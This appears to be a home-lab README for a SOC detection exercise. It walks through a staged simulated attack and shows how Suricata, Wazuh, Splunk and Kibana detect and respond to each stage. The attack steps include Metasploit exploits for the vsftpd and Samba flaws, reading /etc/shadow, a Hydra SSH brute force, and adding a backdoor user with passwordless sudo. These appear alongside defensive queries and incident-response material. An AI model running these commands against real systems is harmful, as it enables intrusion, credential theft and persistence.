# Attack Simulation

A 9-stage simulated attack against two targets on the `192.168.56.0/24` lab network. Stages 1–4 target Metasploitable (no agent — network detection only). Stages 5A–5C target Ubuntu S4 (Wazuh Agent — host detection + Active Response). Stages 6–9 cover the IR and SIEM layers.

---

## Pre-Simulation Checklist

Run these checks before starting any attack stage.

**On Kali:**

```bash
# Start Suricata on the host-only interface
sudo suricata -l /var/log/suricata/
tail -f /var/log/suricata/fast.log      # confirm it's running and watching

# Splunk Universal Forwarder
sudo systemctl status splunk

# Filebeat
sudo systemctl status filebeat
```

**On Ubuntu S4:**

```bash
sudo systemctl status wazuh-agent
sudo ufw status                         # should show active with ports 22, 1514, 1515 open
```

**On Ubuntu S1:**

```bash
sudo ufw status                         # confirm port 443 open for dashboard
```

**Confirm all dashboards are reachable:**

| Dashboard | URL |
|---|---|
| Wazuh | https://192.168.56.104 |
| Splunk | http://192.168.56.105:8000 |
| Kibana | http://192.168.56.108:5601 |
| TheHive | http://192.168.56.106:9000 *(WIP)* |
| MISP | https://192.168.56.106 *(WIP)* |

---

## Stage 1 — Reconnaissance

**MITRE:** T1046 — Network Service Discovery

### Why This Matters

Before any exploitation, an attacker needs to know what services are running on the target. `nmap -sV -A -O` performs a SYN scan across all ports, attempts service version detection, and runs OS fingerprinting scripts. This generates a significant burst of SYN packets toward the target — exactly the traffic pattern Suricata's `ET SCAN` rules are written to catch.

### On Kali

```bash
nmap -sV -A -O 192.168.56.102
```

### Expected Output

```
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20
3306/tcp open  mysql   MySQL 5.0.51a
```

**Attacker's decision:** vsftpd 2.3.4 → known backdoor (CVE-2011-2523). Samba 3.0.20 → known RCE (CVE-2007-2447). Both are exploitable without credentials.

### Detections

| Layer | Tool | Alert |
|---|---|---|
| Network | Suricata | `ET SCAN Nmap SYN Sweep` |
| SIEM 1 | Splunk | Alert ingested in `linux_server` index |
| SIEM 2 | ELK | Alert visible in Kibana Discover |
| Host | Wazuh | No alert — recon is network-layer only |

### Queries

**SPL (Splunk):**
```spl
index=linux_server suricata.eve.event_type=alert
| table _time, src_ip, dest_ip, alert.signature, alert.severity
```

**KQL (Kibana):**
```
suricata.eve.event_type: "alert"
```

### Screenshots

- `stage1-recon/suricata-fast-log-scan-alert.png` — Suricata fast.log showing ET SCAN signature
- `stage1-recon/splunk-search-scan-alert.png` — Splunk search result
- `stage1-recon/kibana-scan-alert.png` — Same alert in Kibana Discover

> **Note the timestamp on these screenshots.** This is your attack start time marker for the full walkthrough timeline.

---

## Stage 2 — Initial Access: vsftpd Backdoor

**MITRE:** T1190 — Exploit Public-Facing Application

### Why This Works

vsftpd 2.3.4 was distributed with a backdoor inserted into the source code in 2011. When the string `:)` is included in the FTP username during login, the daemon opens a root shell listener on port 6200. The Metasploit module automates this by sending the crafted username and then connecting to the resulting shell. No credentials are required — the backdoor is in the daemon itself.

### On Kali

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
```

Once a shell is returned, generate deliberate noise:

```bash
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
netstat -antp
```

### Detections

| Layer | Tool | Alert |
|---|---|---|
| Network | Suricata | vsftpd backdoor signature + port 6200 shell session |
| SIEM 1 | Splunk | Alert in `linux_server` index |
| SIEM 2 | ELK | Alert in Kibana |
| Host | Wazuh | No alert — no agent on Metasploitable |

### Queries

**SPL:**
```spl
index=linux_server alert.signature="*vsftpd*"
| table _time, src_ip, dest_ip, alert.signature, dest_port
```

**KQL:**
```
suricata.eve.event_type: "alert" AND suricata.eve.alert.signature: *vsftpd*
```

### Screenshots

- `stage2-vsftpd/suricata-fast-log-vsftpd.png` — Suricata alert on vsftpd traffic
- `stage2-vsftpd/splunk-vsftpd-result.png` — Splunk search result
- `stage2-vsftpd/kibana-vsftpd-alert.png` — Kibana alert
- `stage2-vsftpd/wazuh-mitre-t1190.png` — Wazuh dashboard showing MITRE T1190 tag

---

## Stage 3 — Initial Access: Samba RCE

**MITRE:** T1190 — Exploit Public-Facing Application + T1059 — Command and Scripting Interpreter

### Why This Works

Samba 3.0.20 (CVE-2007-2447) passes the username field directly to `/bin/sh` via the `MS-RPC` call without sanitizing it first. By injecting shell metacharacters into the username, an attacker executes arbitrary commands as root — this is command injection through the authentication mechanism itself. The exploit works without any prior authentication.

### On Kali

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
run
```

This opens a second root shell on Metasploitable via a completely different service.

### Detections

| Layer | Tool | Alert |
|---|---|---|
| Network | Suricata | Samba RCE signature |
| SIEM 1 | Splunk | Alert in `linux_server` index |
| SIEM 2 | ELK | Alert in Kibana |
| Host | Wazuh | No alert — no agent on Metasploitable |

### Queries

**SPL:**
```spl
index=linux_server alert.signature="*samba*" OR alert.signature="*SMB*"
| table _time, src_ip, dest_ip, alert.signature
```

**KQL:**
```
suricata.eve.event_type: "alert" AND (suricata.eve.alert.signature: *samba* OR suricata.eve.alert.signature: *SMB*)
```

### Screenshots

- `stage3-samba/splunk-two-signatures.png` — vsftpd + Samba both showing in Splunk
- `stage3-samba/kibana-two-signatures.png` — Same two alerts in Kibana
- `stage3-samba/splunk-vs-kibana-comparison.png` — Side by side screenshot
- `stage3-samba/wazuh-mitre-t1190-t1059.png` — Wazuh MITRE tags T1190 + T1059

---

## Stage 4 — Post-Exploitation: Account Creation

**MITRE:** T1136 — Create Account + T1098 — Account Manipulation

### What This Simulates

With a root shell on Metasploitable, the attacker creates a backdoor account — a common persistence mechanism. This also demonstrates a sustained C2-like session on port 6200, which appears as continuous traffic in both SIEMs.

### Inside the Metasploit Shell (Metasploitable)

```bash
useradd -m backdooruser
echo "backdooruser:password123" | chpasswd
cat /etc/passwd                 # confirm account created
```

### Detections

| Layer | Tool | Alert |
|---|---|---|
| Network | Suricata | Sustained session on port 6200 (C2-like pattern) |
| SIEM 1 | Splunk | Continuous connection visible in timechart |
| SIEM 2 | ELK | Session visible in Kibana |
| Host | Wazuh | No alert — no agent on Metasploitable |

> The account creation itself is invisible to Suricata — it happens inside the shell session. Only the sustained network connection is detectable at the network layer. This is the detection gap that makes host agents necessary.

### Queries

**SPL:**
```spl
index=linux_server dest_port=6200
| timechart count by src_ip
```

**KQL:**
```
suricata.eve.dest_port: 6200
```

### Screenshots

- `stage4-postex/splunk-port6200-timechart.png` — Sustained session timechart in Splunk
- `stage4-postex/kibana-port6200-session.png` — Same in Kibana
- `stage4-postex/splunk-vs-kibana-comparison.png` — Side by side

---

## Stage 5A — SSH Brute Force + Wazuh Active Response

**MITRE:** T1110 — Brute Force

### What This Demonstrates

The attacker pivots to Ubuntu S4 (the monitored endpoint with a Wazuh Agent) and attempts SSH credential stuffing using Hydra and the `rockyou.txt` wordlist. Unlike the Metasploitable stages, this target has a Wazuh Agent — so the brute force is detected at the host level, not just the network level, and **Wazuh automatically blocks the attacker without any analyst intervention.**

### On Kali

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.107
```

### What Wazuh Does Automatically

1. Wazuh Agent reads failed login events from `/var/log/auth.log` on S4
2. Rule 5712 fires: threshold of authentication failures from a single source crossed
3. Active Response module calls `firewall-drop` — executes `ufw` to block `192.168.56.101` on S4
4. Hydra attempts on Kali begin timing out

```bash
# Confirm block on S4
sudo ufw status
# Expected: DENY  192.168.56.101
```

### Detections

| Layer | Tool | Alert |
|---|---|---|
| Network | Suricata | SSH brute force signature |
| SIEM 1 | Splunk | Alert in `linux_server` index |
| SIEM 2 | ELK | Alert in Kibana |
| Host | Wazuh | Rule 5712 + Active Response — IP blocked via ufw |

### Queries

**SPL:**
```spl
index=linux_server alert.signature="*SSH*" OR alert.signature="*brute*"
| table _time, src_ip, dest_ip, alert.signature
```

**KQL:**
```
suricata.eve.event_type: "alert" AND suricata.eve.alert.signature: *SSH*
```

### Screenshots

- `stage5a-bruteforce/wazuh-rule-5712.png` — Wazuh dashboard Rule 5712 alert
- `stage5a-bruteforce/wazuh-active-response-block.png` — Active Response log showing 192.168.56.101 blocked
- `stage5a-bruteforce/kali-hydra-timeout.png` — Kali terminal showing connection timeouts
- `stage5a-bruteforce/splunk-ssh-alert.png` — Splunk SSH brute force alert
- `stage5a-bruteforce/kibana-ssh-alert.png` — Kibana SSH alert

---

## Stage 5B — FIM: Simulated Persistence

**MITRE:** T1136 — Create Account + T1548 — Abuse Elevation Control Mechanism + T1105 — Ingress Tool Transfer

### What This Demonstrates

This stage simulates what an attacker would do after gaining access to the monitored endpoint — establish persistence before the session can be cut. All three commands are run directly on the S4 terminal (simulating an attacker who has already gained access). Wazuh FIM with `whodata` catches all three in real time, names the file changed, the checksum delta, the user, and the process.

### On Ubuntu S4 Terminal

```bash
# Create backdoor account in /etc/passwd
echo "backdooruser:x:1001:1001::/home/backdooruser:/bin/bash" >> /etc/passwd

# Give it passwordless sudo in /etc/sudoers
echo "backdooruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Drop a malicious binary in /usr/bin
touch /usr/bin/malicious_script
chmod +x /usr/bin/malicious_script
```

### Wazuh FIM Response

| File | Alert Type | MITRE | whodata |
|---|---|---|---|
| `/etc/passwd` | Integrity checksum changed | T1136 | root via bash |
| `/etc/sudoers` | Integrity checksum changed | T1548 | root via bash |
| `/usr/bin/malicious_script` | New file created | T1105 | root via bash |

Alerts fire in real time — not on the next scheduled scan (frequency: 300s). This is because `realtime="yes"` and `whodata="yes"` are set on all monitored directories in `ossec.conf`.

### Screenshots

- `stage5b-fim/wazuh-integrity-monitoring-tab.png` — Wazuh Integrity Monitoring dashboard
- `stage5b-fim/wazuh-fim-three-alerts.png` — All three FIM alerts with timestamps
- `stage5b-fim/wazuh-whodata-detail.png` — whodata showing user + process on each alert
- `stage5b-fim/wazuh-mitre-tags.png` — MITRE T1136, T1548, T1105 tags visible

---

## Stage 5C — Vulnerability Detection

### What This Demonstrates

Wazuh's Vulnerability Detection module correlates the list of installed packages on S4 (collected by the System Inventory module) against a CVE database. This simulates the security hygiene check an analyst would run on a newly enrolled endpoint or during incident investigation to identify unpatched exposure.

### On Ubuntu S4

Trigger a manual vulnerability scan:

```bash
sudo /var/ossec/bin/agent-control -r -u 001
```

### Screenshots

- `stage5c-vulndetect/wazuh-vuln-detection-tab.png` — Wazuh Vulnerability Detection tab
- `stage5c-vulndetect/wazuh-cve-list.png` — CVEs listed against installed packages on S4

---

## Stage 6 — Threat Intelligence: MISP

> **Status: WIP** — TheHive/MISP/Cortex installation pending.

### Planned Actions

Create MISP event: `SOC-LAB-001: Multi-vector attack simulation`

| IOC Type | Value | Tag |
|---|---|---|
| IP | 192.168.56.101 | attacker |
| IP | 192.168.56.102 | victim |
| CVE | CVE-2011-2523 | vsftpd backdoor |
| CVE | CVE-2007-2447 | Samba RCE |
| Filename | /usr/bin/malicious_script | persistence |
| Username | backdooruser | persistence |

Tag event with MITRE techniques: T1046, T1190, T1059, T1136, T1110, T1548, T1105

Run Cortex analyser on the `malicious_script` file hash.

### Screenshots (Pending)

- `stage6-misp/misp-event-iocs.png`
- `stage6-misp/cortex-enrichment-result.png`
- `stage6-misp/misp-mitre-attack-galaxy-tags.png`

---

## Stage 7 — Incident Response: TheHive

> **Status: WIP** — TheHive/MISP/Cortex installation pending.

### Planned Case

**Case:** `INC-001: Multi-Stage Attack — Metasploitable + Ubuntu S4`

**Observables:**

| Type | Value | Tag |
|---|---|---|
| IP | 192.168.56.101 | attacker |
| IP | 192.168.56.102 | victim-no-agent |
| IP | 192.168.56.107 | monitored-endpoint |
| Filename | /usr/bin/malicious_script | persistence |
| Username | backdooruser | persistence |
| CVE | CVE-2011-2523 | exploited-vuln |
| CVE | CVE-2007-2447 | exploited-vuln |

**Tasks:**

| Task | Status | Summary |
|---|---|---|
| 1. Identify attack vectors | CLOSED | vsftpd (CVE-2011-2523) + Samba (CVE-2007-2447) |
| 2. Assess lateral movement | CLOSED | SSH brute force on S4 blocked by Wazuh Active Response |
| 3. Identify persistence | CLOSED | backdooruser + malicious_script caught by Wazuh FIM with whodata |
| 4. Containment | CLOSED | Wazuh auto-blocked 192.168.56.101; backdooruser + script removed |
| 5. Pull IOCs into MISP | CLOSED | MISP event SOC-LAB-001 linked |
| 6. Document and close | CLOSED | Full timeline documented |

### Screenshots (Pending)

- `stage7-thehive/thehive-inc001-case.png`
- `stage7-thehive/thehive-observables.png`
- `stage7-thehive/thehive-tasks-closed.png`
- `stage7-thehive/thehive-misp-linked.png`

---

## Stage 8 — Splunk Dashboard

### Build the Attack Timeline Dashboard (Ubuntu S2)

Navigate to **Splunk Web → Search & Reporting → Dashboards → Create New Dashboard**

**Panel 1 — Alerts Over Time (bar chart)**
```spl
index=linux_server suricata.eve.event_type=alert
| timechart count by alert.severity
```

**Panel 2 — Top Source IPs**
```spl
index=linux_server suricata.eve.event_type=alert
| top src_ip
```

**Panel 3 — Top Signatures**
```spl
index=linux_server suricata.eve.event_type=alert
| top alert.signature
```

**Panel 4 — Full Attack Timeline (table)**
```spl
index=linux_server suricata.eve.event_type=alert
| table _time, src_ip, dest_ip, alert.signature, alert.severity, dest_port
| sort _time
```

Save the dashboard. Set the time filter to cover the entire simulation window.

### Screenshots

- `stage8-splunk/splunk-full-dashboard.png` — Complete saved dashboard with all 4 panels
- `stage8-splunk/splunk-time-filter.png` — Time window covering full simulation

---

## Stage 9 — Kibana Dashboard

### Build the Equivalent Dashboard (Ubuntu S5)

**Important:** All KQL filters must use `suricata.eve.event_type` not `event_type` due to Filebeat → Logstash ECS field mapping.

Navigate to **Kibana → Dashboard → Create dashboard**

**Panel 1 — Alerts Over Time (bar chart)**
- Visualization type: Bar chart
- X-axis: `@timestamp`
- Y-axis: Count
- Filter: `suricata.eve.event_type: "alert"`

**Panel 2 — Top Source IPs (pie chart)**
- Visualization type: Pie
- Slice by: `source.ip`
- Filter: `suricata.eve.event_type: "alert"`

**Panel 3 — Top Signatures (data table)**
- Rows: `suricata.eve.alert.signature`
- Metric: Count

**Panel 4 — Full Attack Timeline (Discover view, saved)**
- Filter: `suricata.eve.event_type: "alert"`
- Columns: `@timestamp`, `source.ip`, `destination.ip`, `suricata.eve.alert.signature`, `suricata.eve.alert.severity`
- Sort by `@timestamp` ascending
- Save as a search, then add to dashboard

### Screenshots

- `stage9-elk/kibana-full-dashboard.png` — Complete saved Kibana dashboard
- `stage9-elk/splunk-vs-kibana-side-by-side.png` — Both dashboards side by side showing same data

---

## Complete Attack Flow Reference

```
[S1] Kali → Nmap scan → Metasploitable
     Suricata: ET SCAN → Splunk (linux_server) + ELK (suricata-*)

[S2] Kali → vsftpd exploit → Metasploitable (root shell #1, port 6200)
     Suricata: vsftpd backdoor → Splunk + ELK
     Wazuh: MITRE T1190 tagged

[S3] Kali → Samba RCE → Metasploitable (root shell #2)
     Suricata: Samba RCE → Splunk + ELK
     Two distinct signatures now visible in both SIEMs

[S4] Post-exploitation: backdooruser created on Metasploitable
     Suricata: sustained C2 session port 6200 → Splunk + ELK

[S5A] Kali → SSH brute force → Ubuntu S4
      Suricata: SSH alert → Splunk + ELK
      Wazuh: Rule 5712 fires → Active Response → ufw blocks 192.168.56.101

[S5B] Simulated persistence on S4 (direct terminal access)
      /etc/passwd modified    → Wazuh FIM: T1136 + whodata (root/bash)
      /etc/sudoers modified   → Wazuh FIM: T1548 + whodata (root/bash)
      /usr/bin/malicious_script → Wazuh FIM: T1105 + whodata (root/bash)

[S5C] Wazuh Vulnerability Detection
      CVE scan on S4 packages → CVEs visible in dashboard

[S6]  MISP: IOC event SOC-LAB-001 — IPs, CVEs, filenames, MITRE tags [WIP]
      Cortex: hash enrichment on malicious_script [WIP]

[S7]  TheHive: INC-001 opened → 6 tasks completed → MISP linked → closed [WIP]

[S8]  Splunk: attack timeline dashboard saved (SPL, linux_server index)

[S9]  Kibana: equivalent dashboard (KQL, suricata-* index)
      Side by side comparison with Splunk documented
```
